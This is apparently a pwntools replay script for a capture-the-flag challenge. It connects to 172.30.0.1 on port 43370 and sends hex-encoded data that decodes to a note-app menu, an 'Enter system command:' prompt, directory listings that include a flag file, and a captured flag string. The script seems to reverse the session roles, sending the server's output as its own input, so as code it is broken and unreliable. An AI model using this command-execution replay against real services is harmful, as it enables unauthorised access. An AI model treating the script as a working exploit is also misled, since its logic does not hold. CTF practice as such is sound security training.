from pwn import *
context.log_level = 'debug'

SIP = "172.30.0.1"
SPORT = 43370

p = remote(SIP, SPORT)

p.send(bytes.fromhex("312e204372656174652061206e6f74650a322e20526561642061206e6f74650a332e2057726974652061206e6f74650a342e2044656c6574652061206e6f74650a352e20436865636b2061206e6f74650a302e20457869740a636d64203e20"))

data = p.recvn(5)
log.info(f"[RECV {len(data)} bytes] {data!r}")

p.send(bytes.fromhex("456e7465722073797374656d20636f6d6d616e643a20"))

data = p.recvn(6)
log.info(f"[RECV {len(data)} bytes] {data!r}")

p.send(bytes.fromhex("4d616b6566696c650a70726f620a70726f622e6370700a"))

data = p.recvn(7)
log.info(f"[RECV {len(data)} bytes] {data!r}")

p.send(bytes.fromhex("746f74616c2035320a64727778722d782d2d2d203120637466202063746620202034303936204175672020312032313a3539202e0a64727778722d78722d78203120726f6f7420726f6f74202034303936204175672020312032313a3539202e2e0a2d72772d722d2d722d2d203120637466202063746620202020323230204175672020312032313a3539202e626173685f6c6f676f75740a2d72772d722d2d722d2d203120637466202063746620202033373731204175672020312032313a3539202e6261736872630a2d72772d722d2d722d2d203120637466202063746620202020383037204175672020312032313a3539202e70726f66696c650a2d72772d72772d722d2d203120726f6f7420726f6f74202020313538204a756e2033302031373a3532204d616b6566696c650a2d727778727778722d78203120726f6f7420726f6f74203230393230204175672020312032313a30332070726f620a2d72772d72772d722d2d203120726f6f7420726f6f74202033343231204175672020312032313a30332070726f622e6370700a"))

data = p.recvn(13)
log.info(f"[RECV {len(data)} bytes] {data!r}")

p.send(bytes.fromhex("746f74616c2031360a64727778722d78722d78203120726f6f74202020726f6f7420202034303936204175672020312032313a3539202e0a64727778722d78722d78203120726f6f74202020726f6f7420202034303936204175672020322030383a3130202e2e0a64727778722d782d2d2d203120637466202020206374662020202034303936204175672020312032313a3539206374660a64727778722d782d2d2d2032207562756e7475207562756e74752034303936204a756c2031342031343a3134207562756e74750a"))

data = p.recvn(13)
log.info(f"[RECV {len(data)} bytes] {data!r}")

p.send(bytes.fromhex("746f74616c2036300a64727778722d78722d78202020203120726f6f74202020726f6f7420202034303936204175672020322030383a3130202e0a64727778722d78722d78202020203120726f6f74202020726f6f7420202034303936204175672020322030383a3130202e2e0a2d727778722d78722d78202020203120726f6f74202020726f6f7420202020202030204175672020322030383a3130202e646f636b6572656e760a6c727778727778727778202020203120726f6f74202020726f6f7420202020202037204170722032322020323032342062696e202d3e207573722f62696e0a64727778722d78722d78202020203220726f6f74202020726f6f74202020343039362041707220323220203230323420626f6f740a64727778722d78722d78202020203520726f6f74202020726f6f7420202020333430204175672020322030383a3130206465760a64727778722d78722d78202020203120726f6f74202020726f6f7420202034303936204175672020322030383a3130206574630a2d72772d722d2d722d2d2020202031207562756e7475207562756e74752020313038204175672020322030383a313020666c61670a64727778722d78722d78202020203120726f6f74202020726f6f7420202034303936204175672020312032313a353920686f6d650a6c727778727778727778202020203120726f6f74202020726f6f742020202020203720417072203232202032303234206c6962202d3e207573722f6c69620a6c727778727778727778202020203120726f6f74202020726f6f742020202020203920417072203232202032303234206c69623634202d3e207573722f6c696236340a64727778722d78722d78202020203220726f6f74202020726f6f7420202034303936204a756c2031342031343a3038206d656469610a64727778722d78722d78202020203220726f6f74202020726f6f7420202034303936204a756c2031342031343a3038206d6e740a64727778722d78722d78202020203220726f6f74202020726f6f7420202034303936204a756c2031342031343a3038206f70740a64722d78722d78722d78203431343120726f6f74202020726f6f7420202020202030204175672020322030383a31302070726f630a647277782d2d2d2d2d2d202020203220726f6f74202020726f6f7420202034303936204a756c2031342031343a313420726f6f740a64727778722d78722d78202020203120726f6f74202020726f6f7420202034303936204175672020312032313a35392072756e0a6c727778727778727778202020203120726f6f74202020726f6f742020202020203820417072203232202032303234207362696e202d3e207573722f7362696e0a64727778722d78722d78202020203220726f6f74202020726f6f7420202034303936204a756c2031342031343a3038207372760a64722d78722d78722d78202020313320726f6f74202020726f6f7420202020202030204175672020322030383a3130207379730a64727778727778727774202020203120726f6f74202020726f6f7420202034303936204175672020312032313a353820746d700a64727778722d78722d78202020203120726f6f74202020726f6f7420202034303936204a756c2031342031343a3038207573720a64727778722d78722d78202020203120726f6f74202020726f6f7420202034303936204a756c2031342031343a3134207661720a"))

data = p.recvn(9)
log.info(f"[RECV {len(data)} bytes] {data!r}")

p.send(bytes.fromhex("5354454c4c417b674141414141426f6a6366596c34776a4f6d66702d65366b554378714f34763969574133494b4e663050444f7031746d456f43757265455a49776f3766365a5934503443724f374d4865714c67444a72596c2d704e626e6b4346767437506b4b5a673d3d7d312e204372656174652061206e6f74650a322e20526561642061206e6f74650a332e2057726974652061206e6f74650a342e2044656c6574652061206e6f74650a352e20436865636b2061206e6f74650a302e20457869740a636d64203e20456e7465722073797374656d20636f6d6d616e643a20"))

p.interactive()
